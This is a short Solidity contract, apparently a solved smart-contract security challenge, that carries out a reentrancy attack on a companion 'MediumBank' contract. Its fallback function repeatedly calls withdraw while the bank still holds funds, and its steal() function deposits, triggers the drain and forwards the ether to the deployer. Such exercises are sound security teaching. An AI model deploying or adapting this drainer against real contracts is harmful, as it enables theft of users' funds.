//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "hardhat/console.sol";

import "./MediumBank.sol";

contract MediumThief {
    address mediumThief;
    MediumBank mediumBank;

    constructor(address mediumBankAddress) {
        mediumThief = msg.sender;
        mediumBank = MediumBank(mediumBankAddress);
    }

    //
    // CHALLENGE: EXCECUTE PART OF THE EXPLOIT HERE
    //
    fallback() external payable {
        if (address(mediumBank).balance >= msg.value) {
            mediumBank.withdraw();
        }
    }

    //
    // CHALLENGE: EXCECUTE PART OF THE EXPLOIT HERE
    //
    function steal() external payable {
        mediumBank.deposit{value: msg.value}();
        mediumBank.withdraw();

        (bool success, ) = mediumThief.call{value: address(this).balance}("");
        require(success);
    }
}
